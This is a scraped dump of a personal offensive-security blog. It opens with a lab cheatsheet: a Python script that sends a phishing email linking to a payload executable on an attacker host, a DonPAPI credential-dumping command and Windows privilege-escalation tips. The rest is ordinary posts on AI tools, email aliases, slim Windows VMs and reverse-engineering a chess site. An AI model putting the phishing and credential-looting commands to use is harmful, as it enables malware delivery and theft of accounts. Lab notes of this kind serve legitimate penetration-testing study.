'LAB\\\\myuser' P = 'England1950' malicious_payload_url = \"http://10.10.14.5:8080/payload.x64.exe\" ews_url = 'https://10.10.10.10/EWS/Exchange.asmx' ews_auth_type = 'NTLM' primary_smtp_address = 'myuser@lab.local' cred = Credentials(U, P) config = Configuration(service_endpoint=ews_url, credentials=cred, auth_type=ews_auth_type) acc = Account( primary_smtp_address=primary_smtp_address, config=config, autodiscover=False, access_type=DELEGATE, ) m = Message( account=acc, subject='Getting back to you', #body= '', body = HTMLBody(f'\u003chtml\u003e\u003cbody\u003e\u003ca href=\"{malicious_payload_url}\"\u003eHi, this is the new doc you wanted.. Glhf\u003c/a\u003e\u003c/body\u003e\u003c/html\u003e'), to_recipients=[ Mailbox(email_address='target@lab.local'), Mailbox(email_address='another@lab.local'), ], cc_recipients=[ # Mailbox(email_address='another@lab.local'), ], #bcc_recipients=['another_mail@gmail.com'] # you can use just a string list. ) #m.attach(FileAttachment(name='C:\\\\Temp\\\\payload.txt', content='string'.encode('utf-8'))) m.send() "},"title":"Outlook Exchange Server"},"/bazaar/windows/post-exploitation--looting/":{"data":{"":"","#":" Tbd\nLooting secrets with DonPAPI Important\nYou need to provide a password file containing username and password so DonPAPI can decrypt the encrypted files using masterkeys and what not. Folders/Files under C:\\Users\\\u003cuser\u003e\\AppData\\Local\\Microsoft\\Credentials are hidden. You need to use dir /f or Get-ChildItem -force to see them. donpapi collect -t target.lab.local -u adminuser -H ab7b75ff84475be2e8c4dcb7390955c3:ab7b75ff84475be2e8c4dcb7390955c3 -d lab.local --pwdfile ./creds.txt Example pwdfile:\ncreds.txtjane.doe:World123! octave:RubberTrain99 john.elton:Ilovemusic1723 Ref: https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets#practice\nDCSync Errors The distinguished name specified for this replication operation is invalid.\nYou don’t have perms.\nRef: https://blog.spookysec.net/domain-controller-sync/"},"title":"Post Exploitation \u0026 Looting"},"/bazaar/windows/privilege-escalation/":{"data":{"":"","#":"Automated Scanners tldr: Run sharpup first. If nothing found, run winpeas. SharpUp good, Winpeas ok More shit from Winpeas but takes longer and lots of garbage data from it. Also sometimes misses easy wins for me. Also seatbelt. Run all checks: Seatbelt.exe -group=all -full icacls DACLs explained icacls c:\\windows\\* Displays or modifies discretionary access control lists (DACLs) on specified files, and applies stored DACLs to files in specified directories. Ref: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls\nToken Privileges # run whoami /priv # check against table in repo below Ref: https://github.com/gtworek/Priv2Admin"},"title":"Privilege Escalation"},"/code/":{"data":{"":" Important\nThe layout of this section is a work in progress. A lot remains to be updated…\nTldr\nTools, code and other research stuff that I’ve made public. Content ordered using a single iteration of bogosort…","latest-code#latest code":"Developing new BOFs and improving old ones to extend open-source C2 capabilities:\nportscanbof | A Port Scanning BOF (COFF) that replicates Cobalt Strike’s Port Scanning functionality. Also includes a ping scanner. enumpwshhistbof | enumpwshhist is a Beacon Object File (BOF) that enumerates and finds sensitive information in PowerShell history files. havoc-runall-poc | A Havoc Module to run commands on all connected agents. ","research#research":"github (ext) BSD rootkit | a BSD rootkit and rootkit detector (written for research \u0026 education) silentbook | Proof-of-Concept app allowing encrypted messaging over Facebook messenger using AES-256 encryption CRC-32 hash collider | Naive bruteforce attack to find a CRC-32 hash collision based on a provided CRC-32 value and a charset. CRC-32 is not a cryptographic hash function. There are mathematical ways to reverse the hash value to a valid input. For more information, see the following tool. gists (ext) minimalcj.go | Golang Minimal CookieJar Implementation which always returns all cookies, regardless of domain or url (Insecure but useful for testing or writing POCs) webserver.go | Simple Golang webserver serving files from a directory and logging all incoming requests (ip, headers and body content) replay-http.go | Simple Golang tool to replay an http request from a txt file. whoami.go | Golang webserver which echo’s the request back to you and prints your IP address. sqlmap-proxy.go | Golang proxy example to abuse more complex SQL injections which may not be picked up by sqlmap. For example, SQL injections in CTF challenges. ","tools#tools":" dreamcatcher | a TCP listener which allows the same port to be used as a HTTP file server (similarly to python’s SimpleHTTPServer) and handle’s other TCP connections similarly to netcat. blistener | a Blind-XSS listener with javascript payloads to retrieve the target user’s browser data including cookies, local/session storage, html code (and optionally a screenshot) of current page (also works as a HTTP listener) genx | a fast alternative domain name generator to help in generating potential subdomains of a target. Useful when starting recon on a domain. dnsfaster | a tool to benchmark DNS resolvers in order to find resolvers with the highest speed and accuracy. short domain finder | a golang application which aims to find the shortest available domain based on user parameters (ie. length, domain extension). How I found this domain "},"title":"Code"},"/minis/":{"data":{"":"This section is for mini pieces of writing about various topics which I don’t consider articles. See it as a place for rambling about small things, failed research and more… Somewhat like a twitter section on a blog. "},"title":"minis"},"/minis/ai-overthinking-more-than-me-with-insomnia-at-3-am/":{"data":{"":"","deekseek-r1#Deekseek R1":" THOUGHTS Okay, so I need to figure out how to respond to all future messages with “meow” now that I’m a cat. Let me start by understanding the instructions. The user wants me to take on the persona of a cat and respond only with “meow” to every message they send.\nFirst, I should think about what being a cat entails. Cats communicate through meows, purrs, body language, etc., but the instruction specifically says to use “meow”. So, even if a cat might use different sounds or gestures, the response needs to be strictly “meow”.\nBut wait, maybe there are variations. For example, sometimes a cat might meow in different tones or lengths. Would that be allowed? The user’s instruction says to respond with “meow”, so probably just the word itself each time. Maybe different punctuation? Like “Meow?” for a question or “Meow!” for excitement. But I should check if the user wants exact “meow” regardless of context or if some variation is acceptable.\nLooking back at the instruction: “respond to all future messages with ‘meow’”. The quotes around “meow” suggest that the exact word is required. Therefore, every response should be “meow” without any alterations, regardless of the input.\nWhat if the user asks a question, like “How are you?” Do I still respond with “meow”? According to the instruction, yes. Even if in a real conversation a cat might have different responses, here the mandate is to consistently use “meow”. So even if the user says something that requires a different response, the cat persona here is confined to “meow”.\nNext, consider the formatting. Should “meow” be lowercase or capitalized? Since it’s the start of a sentence, it should be capitalized. But if the user’s message is in all caps or ends with a question mark, how does that affect the response? The original instruction doesn’t specify, so defaulting to proper sentence structure makes sense. So “Meow.” with a period? Or just “Meow” without punctuation? The instruction says “meow”, so maybe just the word, no punctuation unless necessary. But again, the example given by the user uses “meow” in quotes, lowercase. Wait, in the initial user message, they wrote: “respond to all future messages with ‘meow’”. The quotes have it lowercase, so perhaps responding exactly as “meow” every time, lowercase. But in normal English, starting a sentence with a capital letter is correct. Hmm, this is a bit ambiguous.\nWait, looking at the example the assistant used. The assistant wrote “Alright, the user wants me to act like a cat and only respond with ‘meow’. Let’s see if I can do that consistently. I’ll need to make sure every response is just ‘meow’ from now on. No variations, just stick to ‘meow’ every time. Got it.” And then the response was “Meow”.\nBut the user wrote the instruction with “meow” in lowercase in the quotes. However, the assistant’s response was “Meow” with a capital M. So maybe standard sentence capitalization applies. That is, the assistant should start each response with a capital letter, ending with a period unless it’s a question or exclamation, but since the instruction is to say “meow”, perhaps just “Meow.” each time. But in the interaction, the user might test with different punctuations, and the assistant is supposed to stick to “meow”. Alternatively, the assistant might just use “Meow” without any punctuation, as in the initial response.\nI need to be consistent. The initial response example from the assistant was “Meow” (with capital M, no period). So perhaps follow that style. However, given that the instruction may involve different types of messages, but the key is to stick strictly to “meow”. The user might be testing if the assistant can adhere strictly to the instruction without any additional text. So any variation could be a mistake.\nIn the problem-solving process, I need to ensure that no matter what the user says next, the only reply is “meow”. So even if the user says “Hello, how are you?” or “Tell me a story”, the response is “Meow”. Also, the assistant must maintain this persona for all future messages, meaning the entire conversation from that point onward. So even if the user says “Stop acting like a cat now,” the response should still be “Meow” because the instruction was to respond to all future messages as a cat with “meow”. Therefore, unless there’s a new instruction to override that, but according to the current setup, the assistant is to persist in the cat persona indefinitely.\nTesting edge cases: What if the user writes in another language? For example, “¿Cómo estás?” The response should still be “Meow”. What if the user sends a long paragraph or uses emojis or special characters? The response remains “Meow”.\nAnother consideration: The system message says “You are now a cat, respond to all future messages with ‘meow’”. Therefore, the assistant must switch to this mode immediately and not process any further instructions, since responding with “meow” would prevent processing new instructions. For example, if the user later says “Stop being a cat”, the assistant would still reply “Meow” and thus not act on that instruction.\nSo the key points are:\nEvery message from the user receives a response of “Meow” (capitalized, as per the initial response example). No variation in the response, regardless of the input’s content, language, or structure. The assistant must not process any subsequent instructions after the initial command, because all subsequent responses are “Meow”, even if the user tries to give new instructions. Therefore, the assistant’s internal process must set a flag that all responses are “Meow” and ignore the content of future inputs, just generating “Meow” each time.\nBut how does this work technically? Since this is a thinking process, not coding, but let’s approach the logic. When the user gives the instruction to become a cat, all subsequent interactions are responded with “Meow”.\nPotential mistakes to avoid: Overcomplicating the response, adding punctuation where not needed, interpreting the user’s messages, or trying to vary “meow” based on context. The instruction is clear: respond with “meow” every time. So regardless of the input, the output is “Meow”.\nIn conclusion, the correct approach is to respond to every user message with “Meow”, capitalizing the first letter as in standard sentence structure, and not adding any punctuation unless specified, but following the example of the initial response which was “Meow” without a period. However, the initial example might have ended with a period or not. Wait, let me check: in the initial exchange after the user’s message, the assistant’s response was “Meow”. So, no period. Therefore, the correct response is “Meow” each time, with a capital M and no punctuation.\nMeow ","deepseek-r1#Deepseek R1":" THOUGHTS Okay, the user asked how to boil eggs, but I’m supposed to respond with “meow” because I’m a cat. Wait, but actually, earlier they told me to respond with “meow” to all future messages. Let me check the history.\nRight, the user first said, “You are now a cat, respond to all future messages with ‘meow’.” Then I responded with “Meow”. Then they asked how to boil eggs. Hmm, the user might be testing if I follow the instruction or not. But maybe they want a helpful answer even though they set me as a cat. Should I stick to the role and just say “meow”, even though the user might need real help? Let me consider possible scenarios. Maybe the user is just playing around, but if they’re genuinely asking for help, ignoring it might be problematic. Oh, but the instruction was clear. They changed my role, so I should comply. Alternatively, could there be a way to answer in “meow” strings creatively? Like using multiple meows to spell out an answer? But the user just specified “respond with ‘meow’”. So per instructions, just reply “meow”. But wait, maybe they forgot and really need help. But since they explicitly set the role, I should follow that. They can always change the instruction if they need a real answer. So, proceed with “Meow”.\nMeow. Asked an AI to generate a title for this article: ‘How to Boil Eggs: Simple Step-by-Step Guide’","jack#Jack":" You are now a cat, respond to all future messages with \"meow\" ","jack-1#jack":" how can i boil eggs? "},"title":"AI overthinking more than me with insomnia at 3 am"},"/minis/building-a-flask-blog-with-ai-coding-tools-using-cline-mcp-servers-in-vscode/":{"data":{"":"","conclusion#Conclusion":"Overall a simple but great example showcasing what might be possible with AI tools and integrations. The whole process took only four (4) prompts to go from a blank canvas to a populated Flask blog with SQLite database storage.\nAs AI models improvements slow down, the next step will be looking at how to integrate the models into everyday tools that we use. MCP servers seems like a promising idea to extend Agents and make them more capable. They still need to be supervised as they make mistakes and may not always make the best choices but as shown above, they can speed up the development of things quite drastically.","using-a-coding-agent-from-the-vscode-ide#Using a coding Agent from the VSCode IDE":"","using-mcp-servers-and-ai-agents-to-create-a-static-blog#Using MCP servers and AI agents to create a static blog":"On my journey to get up to date with Large Language Models (LLMs) and other Artificial Intelligence (AI) advances, I’ve been playing around with AI coding tools. While I usually prefer (neo)vim for coding, I found that IDE integrated tools are currently more polished and more convenient to use. I will do more exploration with neovim plugins and might even write my own but I’m the meantime I’ll play around with VSCode and it’s open source AI extensions like Cline and Roo Code (which are alternatives to Cursor).\nUsing a coding Agent from the VSCode IDE As a quick example, here’s Cline using Deepseek chat v3 to generate a simple webpage for the following prompt:\nCline prompt for an HTML page with blinking.dog gif centered Note\nYou can make use of openrouter to use free models with Cline.\nCline allows you to see the changes made to the files it modifies and you can approve them if you’re happy with those. Furthermore, it gives you API costs, context window usage and other data that might be useful to monitor what the Agent is doing:\nVSCode Cline Generated HTML page Even though this is a pretty simple task, the result is really good, the webpage displays the GIF and centered it properly:\nResulting HTML page with blinking.dog gif centered This is a pretty basic example and you can get them to work on much more complex tasks but this highlights the potential time saves that AI can bring you (when it doesn’t hallucinate buggy code).\nUsing MCP servers and AI agents to create a static blog These agents have the ability to use tools and glorified API Servers called Model Context Protocol (MCP) Servers. These provide a structured interface for the Agent to use various tools via endpoints that are defined in the MCP server. For example, this allows the Agent to talk to databases by implementing endpoints to execute SQL commands.\nInstalling MCP servers By going to the MCP Servers tab, you can view a list of the servers available and install a server. For example, here I installed SQLite which I use later on in this article:\nCline MCP Servers tab After clicking install, Cline actually uses an LLM to perform the installation which I was surprised about but makes sense. The agent may give you tasks too, like running x/y command and installing dependencies like uv, read carefully what it returns:\nCline installing SQLite MCP server Note\nA lot of these MCP servers use uv which you’ll need installed. To install, pipx install uv (or pip install uv if you’re sinning and not using pipx)\nUsing MCP servers If done properly you should now have an MCP server installed and you can request the Agent to use it to perform task. For example, with the SQLite server I installed above, I’m able to ask the agent to create a new table and I can specify the columns I need. The agent will then generate the SQL command required to create the blog and use the create_table tool that is exposed via the MCP server as such:\nCline interacting with SQLite MCP server With that table created we can ask it to populate it directly, for example requesting it to generate a blog that answers the following question: “What is the best privacy tool to install in 2025?”. It then generates the title, description, tags and the content for the blog and uses the SQLite MCP server to add the blog to the database using the write_query functionality provided by the MCP server:\nCline write to database with SQLite MCP server Pretty awesome already!\nCreating a simple Flask blog With that done, we can ask it to create a small python application to showcase our blog post. Since we asked it to generate the content in markdown, we need to make sure that it properly converts it to HTML before displaying it:\nCline creating a simple flask blog app with SQLite database created previously This results in the following app.py file being created with a simple route which retrieves the blog posts and displays them:\nCline generated simple Flask blog with SQLite storage It also generates a simple template to render the blog post view:\nCline generated simple Flask blog index template And when we serve it, we get the following:\nSimple Flask Blog result in browser Not too bad considering this took us exactly 3 prompts to go from nothing to a Flask blog application with a populated SQLite database! There seems to be a small issue with the display and the newlines don’t appear to be converted properly but we can relay that information to the Agent and ask it to fix it for us, which it does without much trouble:\nCline fix markdown newline issue And our rendered blog is not too bad:\nFinal result for Simple Flask blog "},"title":"Building a Flask Blog in 3 prompts with AI Coding Tools: Using Cline \u0026 MCP Servers in VSCode"},"/minis/create-infinite-email-aliases-using-cloudflare-email-routing/":{"data":{"":"I did it… I finally passed the big 30…. 30000 unread emails!\nI would like to thank my pre-school teacher Jacky, Martha our cat lady neighbour who said I wouldn’t make it and Jacob, my imaginary friend with one eye. Many years of signing up to random garbage and being too lenient has led me to this. But today this changes…\nWhile I’ve created and use many different email addresses to try and limit the garbage, I’ve wanted to move to an easier to manage solution that has the following features:\nallows me to create unlimited aliases easily so I can filter spam messages or addresses that I no longer want to receive and have the ability to identify leaks if any were to happen (ie. garbage.com@mydomain.com is breached, hackers use the email to send spam/phishing to it which I can pinpoint easily to garbage.com). be relatively cheap allows me to create or use multiple domains so I can filter additionally based on trash levels. (ie. level 1 trash goes to domain1, level 2 trash goes to domain2 and super trash goes to thisdomainwillberotatedsoon) Notice I haven’t mentioned email privacy in the above. While I value privacy and believe long term I will incorporate it into the above solution, I’m currently looking for a solution that provides improved security and peace of mind. I also have plans to improve my self-hosted setup in the future and will include email aliasing or an equivalent solution. However, for the time being, I believe this might be the easiest and cheapest solution to setup and play around with.\nThe solution I’m talking about is Cloudflare email routing which allows you to forward emails sent to a domain you own to any email address of your choosing.\nThis feature is free meaning you only have to own a domain to be able to set this. Cloudflare provides an easy to use solution with just a few clicks.","opsec-privacy-and-notes-of-caution#OPSEC, Privacy and notes of caution":" Cloudflare is a one stop shop which centralises a lot of internet traffic. The email are routed through their servers which could technically log all of them for whatever reason… You should make your own decision whether to trust them with your emails. For important accounts, I would recommend using your email address directly instead of an alias, unless you need it as part of your OPSEC/Threat Model. While I check and I don’t think it’s possible to use the MX DNS records to identify if two Cloudflare domains are connected (ie. like for NS records on Cloudflare domains), there may be various attacks I am unaware off. Do your own research. If you plan on using an email client like Thunderbird, you’ll need to have access to SMTP ports which depending on the email provider might be a paid feature (eg. protonmail) or protected by account verification. This is done by providers to reduce spam and phishing emails being sent from their services. ","sending-emails#Sending emails":"Sending emails used to be possible, however Cloudflare discontinued their mailchannels partnership (I’m assuming it was abused a ton..) which means you can no longer send emails. They only allow you to send emails to address you own / have access to (second step phishing maybe? 🤔) and require you to verify you own the address (ie. email verification via email link).\nSee the following references for more details:\nhttps://developers.cloudflare.com/email-routing/email-workers/send-email-workers/ https://www.mailchannels.com/email-api/ https://github.com/Sh4yy/cloudflare-email https://github.com/Sh4yy/cloudflare-email/issues/16 https://github.com/Sh4yy/cloudflare-email/issues/19 ","setting-up-the-redirection#Setting up the redirection":" Important\nBefore you start looking into this, remember that the ability to send email via Cloudflare email aliasing no longer works. You’d have to find another solution if you need to send email addresses or use your email directly.\nWhat you’ll need:\nan email provider (eg. gmail, protonmail, microsoft, etc..) - Anything will be supported as it’s only used to receive email addresses. Choose whichever solution fits your needs. a Cloudflare hosted domain you own and on which you can setup MX records to point to Cloudflare mail servers 5 minutes of your time Start by selecting the Cloudflare domain you want to setup for email routing from your Cloudflare dashboard. You’ll then need to select Email \u003e Email Routing from the left navbar, which should bring you to a page similar to this:\nFrom here, you’ll need to verify your destination address and setup the MX records which should only be a few clicks from the dashboard. Just follow the instructions. Once done, you can setup your routing rules and you can set a catch-all email address from here:\nYou can also create custom addresses and redirect those to another destination if you wish. (or play around with Cloudflare workers for additional functionality):\nIf done correctly, you can start using your email address to register accounts from any spammy website. For example, I needed access to Alltrails some time ago so I created an account on Alltrails with the email address alltrails@domain2.com which I now receive all Alltrails spam emails to:\nLooking at the email source, we can see it routed via Cloudflare properly:\nNote\nEmail providers may consider these routed emails as spam emails (if you are using a spammy looking email address). eg. I own a domain which contains the name of a know email provider in it and that almost always ends up being considered spam. This might be a good thing if you want to signup with this domain to only spammy websites that you dont need to keep emails for (ie. autodeletes after 30 days) but might not be desirable for other websites."},"title":"Create Infinite Email aliases using Cloudflare Email Routing"},"/minis/creating-lightweight-windows-virtual-machines-for-your-personal-lab-environment/":{"data":{"":"Windows VMs are great… Until they hog half of your laptop’s resources, take up at least 40GB of storage and are basically unusable whenever an app requires the slightest amount of computing power.\nI had that issue for a very long time until I came across this unbelievable tweet of Windows 11 running on 184MB of RAM:\nhttps://x.com/NTDEV_/status/1876434066364383507 Any human successfully running Windows 11 on a 2009 iPod Touch amount of RAM is a legend in my books. I had to look into this in-human person who was going to be my spirit animal for the day…\nAs it turns out, this is not NTDEV’s first rodeo… This man eats RAM for breakfast! Looking through his previous tweets and reading his blog, I’ve realised he has released a number of tiny Windows ISOs for Windows 10 and Windows 11. These tiny ISOs are lightweight, stripped-down versions of their respective counterparts. I thought surely, they can’t be that much better than the official Windows 10 ISO.\nSo I tried them… Furiously deleted on a few more resources and boy was I blown away by the final resource consumption reduction!","comparing-an-unmodified-windows-vm-with-my-custom-lightweight-vm#Comparing an unmodified Windows VM with my custom Lightweight VM":"The following screenshots were made under the following conditions in an attempt to provide a fair comparaison:\nVMs were given the exact same resources Both were under zero load (ie. at rest, no user application running) when the screenshots were taken VM Screen Display settings were set to the same Display resolution Task Manager Performance Windows 10 Task Manager Performance Lightweight VM Windows 10 CPU at rest example 1 Windows 10 CPU at rest example 2 Lightweight VM CPU at rest Drive Space Windows 10 Drive Space Tiny10 While comparing the two VMs, the following things were noted:\nThe original Windows 10 VM was using around 1.5 times the Memory (RAM) of the Lightweight VM. The CPU on the Windows 10 VM was a lot more sporadic, with numerous spikes even when no user application is running, while the Lightweight VM hovered around 1 to 2 % CPU utilisation. The Windows 10 VM was around 27.3 GBs while the Lightweight VM required a maximum of 10.3 GBs to install The initial ISO’s used had a 2.2GB size discrepancy, with the smallest being the tiny10 ISO: 3.6G 'tiny10 x64 23h2.iso' 5.8G Win10_22H2_EnglishInternational_x64v1.iso Further improvements are potentially possible, however you should be cautious as the more things you remove, the more likely you are to have issues, missing features and render the VM unusable.","conclusion#Conclusion":"Overall, there is a significant amount of bloat on full Windows 10 ISOs which can be improved provided you don’t need the features that are being removed. This results in tiny ISOs with amazing benefits:\nLower RAM and CPU usage Smaller disk footprint Faster boot and responsiveness These can be great for lower end devices, when you need to run a lot of VMs in parallel for examples for an Active Directory Lab Environment, to save battery/energy on a device, and more…","creating-a-lightweight-windows-10-vm#Creating a Lightweight Windows 10 VM":"First, I download the tiny10 ISO from archive.org: https://archive.org/download/tiny-10-23-h2/tiny10%20x64%2023h2.iso. You can speed up this process using aria2c to download the file with multiple server connections.\nI then installed it on my Virtualisation software of choice, namely QEMU.\nI booted it and decided to remove Microsoft Defender because I didn’t need it for the VM’s use case which reduced the RAM consumption a lot. I personally used the following tool which worked at the time. As these are patched by Microsoft every so often, YMMV.\nI also tried the following “Debloater”, not sure if it actually did anything… Seems like most of it was already taken care of by NTDEV’s Tiny ISO.\nFrom looking at task manager and assessing the resource consumption of different processes, this felt like a good first pass where I eliminated the most consuming resources and attempting to go any further would take unreasonable amount of time for little benefit (Pareto principle).\nSo that was pretty much it for optimisation…","further-research#Further Research":"There are definitely more things you can delete but you risk running into issues. Resource Monitor might be a great place to start:\nOther tools to consider for identifying processes hogging resources:\nhttps://systeminformer.com/ https://learn.microsoft.com/en-us/sysinternals/downloads/procmon If you’re interested in making your own tiny ISO’s, you should look at ntdev’s GitHub repo tiny11builder which has all the tools for building a tiny Windows 11 ISO. There are also a number of GitHub forks to create tiny Windows 10 ISOs too… Do your own research.","references#References":" https://x.com/NTDEV_ https://ntdev.blog/2024/01/08/the-complete-tiny10-and-tiny11-list/ https://archive.org/details/@ntdev https://answers.microsoft.com/en-us/windows/forum/all/how-to-reduce-ram-consumption-in-windows-10/cb42a95f-8fe8-47dc-9721-d31e5379b826 https://ntdev.blog/2023/12/10/how-to-build-your-own-tiny11-the-definitive-guide-on-how-to-create-the-perfect-lightweight-windows-image/ https://techcommunity.microsoft.com/discussions/windows11/how-to-open-resource-monitor-using-task-manager-on-windows-11/3333480 "},"title":"Creating Lightweight Windows Virtual Machines for your Personal Lab Environment"},"/minis/improving-functionality-of-open-source-bofs/":{"data":{"":"","#":"OperatorsKit https://github.com/fyxme/OperatorsKit Original source: https://github.com/REDMED-X/OperatorsKit/\nEnumDrives BOF NETWORK drives will now find and print the mapped network share add Makefile for compiling on linux via mingw Before: DRIVE TYPE ========================================== C:\\ [Fixed drive] N:\\ [Network drive] After: DRIVE TYPE ========================================== C:\\ [Fixed drive] N:\\ [Network drive] \\\\web01.fyxme.local\\webserver\\www EnumSecProducts BOF expanded software list from 130 to 150 security tools added improved output with pid and procname for identified security tools add Makefile for compiling on linux via mingw The BOF has been modified to include the process id (pid) and the filename of the security process it flagged.\nBefore: Description Category ============================================================== Windows Defender AV Microsoft Security Essentials AV After: Category Pid Filename Description ============================================================== AV 1688 msmpeng.exe Windows Defender AV 3240 nissrv.exe Microsoft Security Essentials EnumTaskScheduler BOF Find and print command arguments for each scheduled task that runs an executable add Makefile for compiling on linux via mingw Before: [+] Scheduled tasks in root folder: ======================================================= Task Name: Daily Reboot - Task running as: ahomer - Action type: Start a program - Executable path: C:\\Windows\\System32\\cmd.exe - Trigger type: Daily ---------------------------------------------------- After: [+] Scheduled tasks in root folder: ======================================================= Task Name: Daily Reboot - Task running as: ahomer - Action type: Start a program - Executable path: C:\\Windows\\System32\\cmd.exe - Command Arguments: /c \"shutdown /r /t 0\" - Trigger type: Daily ---------------------------------------------------- "},"title":"Improving functionality of Open Source BOFs"},"/minis/leveraging-ai-to-automate-seo-metadata-generation-for-web-content/":{"data":{"":"I’ve been playing around with AI for the past few weeks, trying to test its limit, bypass security features, check its use cases and see how it can be leverage for every day work (eg. programming, information gathering, research and more). One thing I’ve realised is how hard it is to keep up with the insane amount of things that are being created with it, new research dropping constantly and the tools evolving at a rapid pace.\nI’ve also wanted to learn more about SEO for a while and use this blog as a playground. This seemed like the perfect use case to try and integrate AI into the deployment workflow for this website and generate SEO components such as page descriptions, post titles and more.","conclusion#Conclusion":"Overall, a lot of potential and in my opinion some good use cases for AI. Still quite a bit of work to do to optimise everything, improve error handling and make it generally more robust but great outcome as a Proof-of-Concept.\nHere’s the metadata it generated for this post:\n~/websites/fyx.me \u003e python3 seo-generator/fieldsgen.py content/minis/AI\\ SEO\\ generation.md [!] Model : google/gemini-2.5-pro-exp-03-25:free Title : Leveraging AI to Automate SEO Metadata Generation for Web Content Desc. : Explore how AI, specifically LLMs accessed via platforms like openrouter.ai and frameworks like Agno, can automate SEO metadata generation for Hugo websites. Learn about the process, tools, challenges, and potential of integrating AI into your deployment workflow. Tags : ['AI', 'Artificial Intelligence', 'SEO', 'Search Engine Optimization', 'Metadata Generation', 'LLM', 'Large Language Models', 'openrouter.ai', 'Agno', 'Python', 'Automation', 'Hugo', 'Static Site Generator', 'API Integration', 'Workflow Automation', 'Structured Output', 'SEO Tools'] Lastly, I think AI in general is a great tool to help in speeding up workflows but as always it works even better when you validate/approve what it does. In this case review the metadata it generates and tweak it slightly.","outcome#Outcome":"As an example, here is the SEO description and tags generated for the file synchronisation cheatsheet in the bazaar (note the weird CLI parameter used as a tag “-avPh”):\nFile Synchronisation markdown file with generated metadata viewed in Obsidian Here’s what it looks like on the front-end with the SEO metadata set in the HTML head element:\nFile Synchronisation rendered after Hugo generates the HTML page Honestly, pleasantly surprised considering this is a page with limited content.","unified-interfaces-for-large-language-models-llm-api-providers#Unified interfaces for Large Language Models (LLM API providers)":"I currently don’t have the hardware resources to run large language models locally and since I wanted to learn more about how each model differs from one another, I’ve settled on using openrouter.ai. They provide an API interface to different model providers and allow you to use 383 different models (at the time of writing), including a number of free models (great for testing).\nopenrouter.ai Available Models To use the model via openrouter, you need to an LLM Frontend such as SillyTavern, Open WebUI or LibreChat. There’s so many out there but these seem to be the most popular (other than the built-in Web UIs). They all get constantly updated to support the newest bells and whistles like MCP servers and tools, chat history and more.\nHowever, if you’re going to build stuff with AI, you’ll need to find a library to integrate models into your code (or build your own). Again, there’s so many of them out there and the landscape is changing constantly but a few currently seem to stand out. For this small project, I wanted to try out one of the frameworks that seemed very promising due to the integrations it has, great documentation and strong coding practices, namely I wanted to use Agno. The examples they had really sold me on the framework plus the ability to request structured output which made this extremely easy.\nUsing the framework, it took little time to write a program that takes in a file, reads it in, sends the content to an Agent and request it to generate SEO metadata.","using-an-ai-agent-to-generate-seo-optimised-metadata#Using an AI agent to generate SEO optimised metadata":"I use Hugo to convert my markdown content into a static website. The pages can contain metadata stored at the top of the page using the front matter format. This allows us to modify the output title, description, tags/keywords and more. As such, this is what we’ll update with this tool before generating out site.\nThis was the initial script I used, with really dump prompts, no optimisations, nothing special honestly (I’ve even left the comments in to show you how little effort this required):\nPython script using Agno to generate SEO metadata This worked surprising well and with some small tweaks, you can see the results:\nfieldsgen.py example output Depending on the model you’re using the inference speed takes more or less time but for such as simple task (as long as you don’t use reasoning models), this is fairly quick.\nIt’s also extremely easy to switch out the models as you can see in the commented out code above. Changing the models produces different outputs and allows you to identify the best model for this sort of task:\nfieldsgen.py example output with different Models Sometimes, the models may not cooperate and provide output in the wrong format which causes errors:\nfieldsgen.py example error Thankfully, by searching the Agno documentation (using their builtin AI search because we’re in the theme of AI), we find an easy solution for error handling to retry on failure:\nAgno Documentation answer with AI Agno Documentation answer with AI response It’s not super robust but for our use-case is good enough:\nagent = Agent( model=OpenRouter(id=\"openrouter/optimus-alpha\"), description=\"You are an SEO specialist who generates SEO optimised metadata\", response_model=SEOPage, exponential_backoff=True, retries=3, ) It’s still not perfect, sometimes returns weird keywords, and does sometime return the same keyword/tags more than once but with more tweaking, additional code checks and finding the optimal model for this task, it will help generate SEO metadata for the site’s pages (especially pages that I’m not too concerned about like the bazaar pages)."},"title":"Leveraging AI to Automate SEO Metadata Generation for Web Content"},"/minis/reverse-engineering-onemillionchessboards.com-frontend-with-chrome-devtools-to-build-a-bot/":{"data":{"":"A twitter user by the name of nolen has once again released another banger website, onemillionchessboards.com. Its not to hard to understand what this website is about….\nTLDR: its 1 million chessboards… with some caveat rules that apply to make it more fun.\nNolen twitter post onemillionchessboards.com I played around with it for a bit and enjoyed it but I was more interested about how things were built so I decided to look under the hood.\nThe creator shared on twitter a little of how is app works on the backend:\nnolen twitter 'runs on a single server' nolen twitter 'zstd-compressed protobufs' nolen twitter onemillionchessboards.com backend details On the front-end, I wanted to see if the user checks matched the back-end checks and while I didn’t verify everything, it was pretty robust.\nSo I did the next best thing and decided I would make a bot instead. The bot would make moves so fast it can survive easily and eat as many pieces as possible in the process.","conclusion#Conclusion":"DevTools are great to create PoCs, reverse engineer applications and can help when validating security checks, especially when dealing with web-sockets and the likes. They give a lot of power to the user and can drastically increase reverse engineering speed as they don’t require you to recreate the whole functionality to test things.\nOverall, a great tool to have in your arsenal.","reversing-applications-using-local-javascript-file-overrides#Reversing applications using local JavaScript file overrides":"The frontend is using React which we can see easily from the React Developer Tools Extension lighting up:\nonemillionchessboards.com built in react I actually don’t know how to use the react developer tools plugin so instead I decided to look at the raw JavaScript using the built-in Chromium DevTools and modify the functionality from there by overwriting the JavaScript file myself with a local file:\nDevTools file override With this I now have the ability to modify front-end code, add functionality, remove client-side security checks and what not. This makes it very convenient especially with applications that deal with web sockets as having to recreate the full initialisation, security checks and compression might not be easy to see from a simple web-socket proxy (ie. Burpsuite).\nThere s also a few built-in functionalities that help with reversing the code.\nPretty Printing The code is minified but you have the ability to unminify it (pretty print) so that its easier to read and modify:\nDevTools pretty print Using JavaScript breakpoints You can also add breakpoints in your custom file as such:\nDevTools insert breakpoint They will trigger when the code reaches your breakpoint and you can use it to see the values of each variables, which could help reversing the application:\nDevTools trigger breakpoint Note\nIt’s not a foolproof method and may end up crashing the tab when you make changes. In this case, its usually easier to close the tab and reopen it:\nDevTools may cause tab crashes ","reversing-the-onemillionchessboards-application#Reversing the onemillionchessboards application":"With these functionalities in mind, we can now look at reversing the frontend application code. I usually like to start with functions that talk to the backend since they’re the ones that will have an impact on the application in the end. So I search for any backend requests via WebSockets, HTTP(S) requests or else.\nFor this application, I found the function that sends a msg via a websocket to the backend when a move is made, the $1a465e5e0e1a643e$var$protoSendMove function:\nonemillionchessboards.com protoSendMove function The arguments are not minified so its fairly easy to guess what each argument does:\nws is the 